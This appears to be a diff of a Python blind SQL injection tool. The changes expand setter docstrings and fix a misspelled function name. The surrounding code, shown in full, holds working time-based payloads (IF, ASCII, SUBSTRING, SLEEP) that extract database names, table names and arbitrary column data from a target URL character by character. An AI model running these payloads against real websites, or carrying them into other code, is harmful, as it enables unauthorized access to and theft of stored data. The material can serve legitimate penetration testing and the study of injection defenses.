@@ -26,7 +26,13 @@ FILEPATH = 'C:\\'
 # Setters
 def setSleep(value):
     """
-    Sets global int SLEEP to int value.
+    Sets the global sleep duration value.
+
+    Args:
+        value (int): The sleep duration value to set.
+
+    Returns:
+        None
     """
 
     global SLEEP
@@ -34,7 +40,13 @@ def setSleep(value):
 
 def setContent(value):
     """
-    Sets global string FILECONTENT to string value.
+    Sets the global file content value.
+
+    Args:
+        value (str): The file content string to set.
+
+    Returns:
+        None
     """
 
     global FILECONTENT
@@ -42,7 +54,13 @@ def setContent(value):
 
 def setName(value):
     """
-    Sets global string FILENAME to string value.
+    Sets the global filename value.
+
+    Args:
+        value (str): The filename string to set.
+
+    Returns:
+        None
     """
 
     global FILENAME
@@ -50,14 +68,20 @@ def setName(value):
 
 def setPath(value):
     """
-    Sets global string FILEPATH to string value.
+    Sets the global filepath value.
+
+    Args:
+        value (str): The filepath string to set.
+
+    Returns:
+        None
     """
 
     global FILEPATH
     FILEPATH = value
 
 # Blind SQL functions
-def checkRequesTime(url, string, max_time, proxy=None):
+def checkRequestTime(url, string, max_time, proxy=None):
     """
     Performs a GET request on the concatenated URL and string, and checks if the response time exceeds max_time.
 
@@ -106,7 +130,7 @@ def extractTableNames(url, base_injection, max_time, proxy=None):
             found_char = False
             for char_code in range(32, 126):  # ASCII printable characters
                 payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
-                if checkRequesTime(url, payload, max_time, proxy):
+                if checkRequestTime(url, payload, max_time, proxy):
                     table_name += chr(char_code)
                     char_index += 1
                     found_char = True
@@ -150,7 +174,7 @@ def extractTableData(url, base_injection, table_name, column_name, max_time, pro
             found_char = False
             for char_code in range(32, 126):  # ASCII printable characters
                 payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
-                if checkRequesTime(url, payload, max_time, proxy):
+                if checkRequestTime(url, payload, max_time, proxy):
                     row_data += chr(char_code)
                     char_index += 1
                     found_char = True
@@ -192,7 +216,7 @@ def extractDatabaseNames(url, base_injection, max_time, proxy=None):
             found_char = False
             for char_code in range(32, 126):  # ASCII printable characters
                 payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
-                if checkRequesTime(url, payload, max_time, proxy):
+                if checkRequestTime(url, payload, max_time, proxy):
                     db_name += chr(char_code)
                     char_index += 1
                     found_char = True
